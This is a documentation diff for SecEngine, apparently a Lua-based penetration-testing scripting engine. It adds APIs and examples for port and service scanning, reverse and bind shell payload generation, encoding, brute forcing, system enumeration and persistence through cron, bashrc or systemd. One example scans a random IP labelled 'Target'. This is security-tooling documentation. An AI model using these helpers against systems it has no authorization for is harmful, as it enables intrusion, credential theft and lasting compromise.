@@ -91,11 +91,53 @@ SecEngine embeds a Lua VM (gopher-lua) to power `.sec` scripts with simple, shel
 | `prompt` | `prompt(text) -> input` | Show prompt and read user input |
 | `colorPrint` | `colorPrint(text, color)` | Print colored text (red, green, yellow, blue, purple, cyan, white, bold) |
 
+### Error Handling
+
+| Function | Signature | Description |
+|----------|-----------|-------------|
+| `attempt` | `attempt(func, ...) -> success, error` | Safe function execution (wraps pcall) |
+| `pcall` | `pcall(func, ...) -> success, ...` | Protected call with error handling |
+
+### Network Reconnaissance
+
+| Function | Signature | Description |
+|----------|-----------|-------------|
+| `tcpConnect` | `tcpConnect(host, port, timeout) -> success, status, banner` | TCP connection test with banner grab |
+| `udpProbe` | `udpProbe(host, port, timeout) -> success, response` | UDP port probe |
+| `serviceDetect` | `serviceDetect(host, port, timeout) -> success, info, error` | Identify service on port |
+| `osDetect` | `osDetect(host) -> success, info, error` | Basic OS fingerprinting via TTL |
+
+### Payload Generation
+
+| Function | Signature | Description |
+|----------|-----------|-------------|
+| `genReverseShell` | `genReverseShell(lhost, lport, type) -> success, payload, error` | Generate reverse shell payload |
+| `genBindShell` | `genBindShell(port, type) -> success, payload, error` | Generate bind shell payload |
+| `encodePayload` | `encodePayload(data, encoder) -> success, encoded, error` | Encode with various methods (base64, hex, url, unicode, xor, rot13) |
+
+### Exploitation Helpers
+
+| Function | Signature | Description |
+|----------|-----------|-------------|
+| `httpRequest` | `httpRequest(url, method, headers, body) -> success, response` | Full HTTP request with custom headers |
+| `fuzz` | `fuzz(template, payloads) -> success, results` | Fuzzing helper with template substitution |
+| `bruteForce` | `bruteForce(target, service, wordlist) -> success, credentials` | Basic brute force (http, ftp) |
+
+### Post-Exploitation
+
+| Function | Signature | Description |
+|----------|-----------|-------------|
+| `privCheck` | `privCheck() -> success, info` | Check current privilege level |
+| `enumSystem` | `enumSystem() -> success, info` | Enumerate system information |
+| `enumNetwork` | `enumNetwork() -> success, interfaces` | Enumerate network interfaces |
+| `persistAdd` | `persistAdd(script, method) -> success, result` | Add persistence mechanism (cron, bashrc, systemd) |
+| `persistRemove` | `persistRemove() -> success, results` | Remove persistence mechanisms |
+
 ### Script Organization
 
 | Function | Signature | Description |
 |----------|-----------|-------------|
-| `require` | `require(script)` | Import/run another .sec script (supports relative paths) |
+| `require` | `require(script) -> module` | Import/run another .sec script (supports relative paths, returns module table) |
 | `exit` | `exit(code)` | Exit script with status code |
 
 ### Script Variables
@@ -130,6 +172,45 @@ var FunctionRegistry = map[string]lua.LGFunction{
     "myfunc": builtinMyFunc,
 }
 ```
+
+## Creating Reusable Modules
+
+SecEngine supports creating reusable `.sec` library modules that can be loaded with `require()`.
+
+### Creating a Module
+
+Create a `.sec` file that returns a table of functions:
+
+```lua
+-- libs/mymodule.sec
+local M = {}
+
+function M.greet(name)
+    return "Hello, " .. name .. "!"
+end
+
+function M.add(a, b)
+    return a + b
+end
+
+return M  -- Return the module table
+```
+
+### Using a Module
+
+```lua
+-- main.sec
+local mymod = require("libs/mymodule.sec")
+
+print(mymod.greet("World"))  -- Hello, World!
+print(mymod.add(5, 3))       -- 8
+```
+
+### Module Path Resolution
+
+- Relative paths are resolved from the calling script's directory
+- Absolute paths are used as-is
+- Example: `require("libs/utils.sec")` looks for `libs/utils.sec` relative to the current script
 
 ## Example .sec Scripts
 
@@ -231,6 +312,136 @@ if ok then
         print("Match " .. i .. ": " .. m)
     end
 end
+```
+
+### Error Handling Example
+```lua
+#!/usr/bin/secshell
+
+-- Safe function execution with attempt()
+local function divide(a, b)
+    if b == 0 then
+        error("Division by zero!")
+    end
+    return a / b
+end
+
+-- Using attempt() for safe execution
+local ok, result = attempt(divide, 10, 2)
+print("divide(10, 2): ok=" .. tostring(ok) .. ", result=" .. tostring(result))
+
+local ok, err = attempt(divide, 10, 0)
+print("divide(10, 0): ok=" .. tostring(ok) .. ", error=" .. tostring(err))
+
+-- Using pcall() for more control
+local ok, val = pcall(divide, 20, 4)
+if ok then
+    print("Result: " .. val)
+else
+    print("Error: " .. val)
+end
+```
+
+### Network Reconnaissance Example
+```lua
+#!/usr/bin/secshell
+
+-- TCP connection test
+local ok, status, banner = tcpConnect("google.com", 80, 3)
+if ok then
+    print("Port 80 is " .. status)
+    if #banner > 0 then
+        print("Banner: " .. banner)
+    end
+end
+
+-- Service detection
+local ok, info = serviceDetect("google.com", 443, 3)
+if ok then
+    print("Service: " .. info.service .. " on port " .. info.port)
+end
+
+-- OS detection via TTL
+local ok, osInfo = osDetect("127.0.0.1")
+if ok then
+    print("OS: " .. osInfo.os .. " (TTL: " .. osInfo.ttl .. ")")
+end
+```
+
+### Payload Generation Example
+```lua
+#!/usr/bin/secshell
+
+-- Generate reverse shell payload
+local ok, payload = genReverseShell("10.0.0.1", "4444", "bash")
+if ok then
+    print("Payload: " .. payload.payload)
+    print("Base64: " .. payload.encoded)
+end
+
+-- Generate bind shell
+local ok, bindPayload = genBindShell("8080", "nc")
+if ok then
+    print("Bind shell: " .. bindPayload.payload)
+end
+
+-- Encode payload
+local ok, encoded = encodePayload("test data", "base64")
+print("Encoded: " .. encoded)
+
+local ok, rot13 = encodePayload("secret", "rot13")
+print("ROT13: " .. rot13)
+```
+
+### Post-Exploitation Example
+```lua
+#!/usr/bin/secshell
+
+-- Check privileges
+local ok, priv = privCheck()
+if ok then
+    print("Level: " .. priv.level)
+    print("UID: " .. priv.uid)
+end
+
+-- Enumerate system
+local ok, sys = enumSystem()
+if ok then
+    print("Hostname: " .. sys.hostname)
+    print("OS: " .. sys.os .. " (" .. sys.arch .. ")")
+    print("User: " .. sys.user)
+end
+
+-- Enumerate network
+local ok, net = enumNetwork()
+if ok then
+    for i, iface in ipairs(net.interfaces) do
+        print("Interface: " .. iface.name)
+    end
+end
+```
+
+### Module Usage Example
+```lua
+#!/usr/bin/secshell
+
+-- Load a reusable library
+local utils = require("libs/utils.sec")
+
+-- Use utility functions
+utils.header("My Security Tool")
+
+-- Generate random IP
+local target = utils.randomIP()
+print("Target: " .. target)
+
+-- Hash passwords
+local hashes = utils.hashAll("password123")
+print("MD5: " .. hashes.md5)
+
+-- Check port
+local open, status = utils.checkPort("google.com", 80)
+print("Port 80: " .. status)
 ```
 
 ## Interactive REPL
